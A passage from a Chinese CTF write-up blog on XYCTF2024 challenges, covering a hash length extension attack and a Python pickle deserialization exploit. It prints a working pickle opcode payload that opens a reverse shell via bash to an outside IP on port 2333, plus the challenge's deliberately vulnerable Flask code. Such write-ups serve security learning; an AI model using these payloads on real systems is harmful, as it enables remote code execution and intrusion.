<p>哈希长度拓展攻击<a target="_blank" rel="noopener" href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/%EF%BC%8Cemmm%E7%9C%8B%E4%B8%8D%E6%87%82%EF%BC%8C%E7%9B%B4%E6%8E%A5%E7%94%A8%E5%B7%A5%E5%85%B7%E4%B8%80%E6%8A%8A%E6%A2%AD%E4%BA%86">https://ciphersaw.me/2017/11/12/hash-length-extension-attack/，emmm看不懂，直接用工具一把梭了</a></p>
<p>工具:<a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkdmY30sV7Pxs8awAZ:/opt/hash-ext-attack# python3 hash_ext_attack.py </span><br><span class="line">2025-07-16 07:34:47.220 | DEBUG    | common.md5_manual:__init__:17 - init......</span><br><span class="line">请输入已知明文：</span><br><span class="line">请输入已知<span class="built_in">hash</span>： 31b81f48a29befbbe01d322512a8a100</span><br><span class="line">请输入扩展字符: 1752651375</span><br><span class="line">请输入密钥长度：43</span><br><span class="line">2025-07-16 07:36:51.547 | INFO     | common.HashExtAttack:run:65 - 已知明文：b<span class="string">&#x27;&#x27;</span></span><br><span class="line">2025-07-16 07:36:51.548 | INFO     | common.HashExtAttack:run:66 - 已知<span class="built_in">hash</span>：b<span class="string">&#x27;31b81f48a29befbbe01d322512a8a100&#x27;</span></span><br><span class="line">2025-07-16 07:36:51.548 | INFO     | common.HashExtAttack:run:68 - 新明文：b<span class="string">&#x27;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x01\x00\x00\x00\x00\x00\x001752651375&#x27;</span></span><br><span class="line">2025-07-16 07:36:51.549 | INFO     | common.HashExtAttack:run:69 - 新明文(url编码)：%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%001752651375</span><br><span class="line">2025-07-16 07:36:51.549 | INFO     | common.HashExtAttack:run:71 - 新<span class="built_in">hash</span>:26c02b957a2e0467a3eeaa52823fa233</span><br></pre></td></tr></table></figure>

<p>然后用脚本爆一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://gz.imxbt.cn:20960/?md5=cc2131f5409a81b2fcf18102b8d0e07e&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;yes, give you flag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby_unserialize"></a>baby_unserialize</h2><p>源码中有<code>&lt;!--try /ser--&gt;</code>，访问看看</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250716163058746.png" alt="image-20250716163058746"></p>
<p>一个base64的反序列化口子，但是不知道参数，分别用get和post传看看</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250716164221945.png" alt="image-20250716164221945"></p>
<p>看到payload就是参数了，盲猜一手java反序列化，先用URLDNS看看能不能出网</p>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>有一个register.php路由，注册后登录进去发现没东西，但是在cookie中发现一个RememberMe的cookie</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gASVOQAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwFYWRtaW6UjANwd2SUjAhhZG1pbjEyM5R1Yi4=</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250716165717617.png" alt="image-20250716165717617"></p>
<p>有东西，然后看到是python，一坨AAAA，猜测这里是pickle的特征，估计是dumps之后并进行base64加密的cookie</p>
<p>写一个test试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span> :</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command = <span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line">a = test()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(test))</span><br></pre></td></tr></table></figure>

<p>但是传进去后提示waf，估计是<code>__reduce__</code>被过滤了，那我们写字节码吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;whoami&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload.encode()))</span><br></pre></td></tr></table></figure>

<p>发现还是不行，估计还过滤了东西，最后测出来过滤了system和import等，用popen吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/124.223.25.186/2333 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">popen</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure>

<p>传入后发现返回5，那就直接反弹shell</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250716172853056.png" alt="image-20250716172853056"></p>
<p>先看看源码吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,session,render_template,redirect,make_response</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Login</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,pwd</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.pwd = pwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkLogin</span>(<span class="params">users,name,pwd</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> user.name == name <span class="keyword">and</span> user.pwd == user.pwd:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUserclass</span>(<span class="params">users,name,pwd</span>):</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">if</span> user.name == name <span class="keyword">and</span> user.pwd == user.pwd:</span><br><span class="line">            <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">b&#x27;r&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">app=Flask(__name__)</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># pickle</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        RememberMe = request.cookies.get(<span class="string">&#x27;RememberMe&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(RememberMe)</span><br><span class="line">        pickle_data = base64.b64decode(RememberMe)</span><br><span class="line">        <span class="built_in">print</span>(pickle_data)</span><br><span class="line">        <span class="keyword">if</span> waf(pickle_data):</span><br><span class="line">            <span class="built_in">print</span>(pickle_data)</span><br><span class="line">            user_class = pickle.loads(pickle_data)</span><br><span class="line">            <span class="comment">#print(user_class)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello world!  &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user_class.name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf!!!!&quot;</span>      </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;login.php&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) <span class="keyword">and</span> (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(username)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="built_in">type</span>(password)==<span class="built_in">str</span> <span class="keyword">and</span> checkLogin(users,username,password):</span><br><span class="line">            user_class = getUserclass(users,username,password)</span><br><span class="line">            RememberMe = base64.b64encode(pickle.dumps(user_class))</span><br><span class="line">            res=make_response(<span class="string">&quot;Login success! &lt;a href=&#x27;/&#x27;&gt;Click here to redirect.&lt;/a&gt;&quot;</span>);</span><br><span class="line">            res.set_cookie(<span class="string">&#x27;RememberMe&#x27;</span>,RememberMe.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register.php&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;POST&quot;</span> <span class="keyword">and</span> (username:=request.form.get(<span class="string">&#x27;username&#x27;</span>)) <span class="keyword">and</span> (password:=request.form.get(<span class="string">&#x27;password&#x27;</span>)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(username)==<span class="built_in">str</span> <span class="keyword">and</span> <span class="built_in">type</span>(password)==<span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">                <span class="keyword">if</span> user.name == username:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Register fail!&quot;</span></span><br><span class="line">            users.append(Login(username,password))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register successs! Your username is &#123;username&#125;.&quot;</span>.<span class="built_in">format</span>(username=username)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register fail!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/07/16/XYCTF2024%E5%A4%8D%E7%8E%B0/" title="XYCTF2024复现">https://wanth3f1ag.top/2025/07/16/XYCTF2024复现/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/XYCTF2024/" rel="tag"># XYCTF2024</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/07/14/CVE-2021-3129%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2021-3129漏洞复现">
                  <i class="fa fa-angle-left"></i> CVE-2021-3129漏洞复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/07/25/NepCTF2025/" rel="next" title="NepCTF2025">
                  NepCTF2025 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.2m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">49:01</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
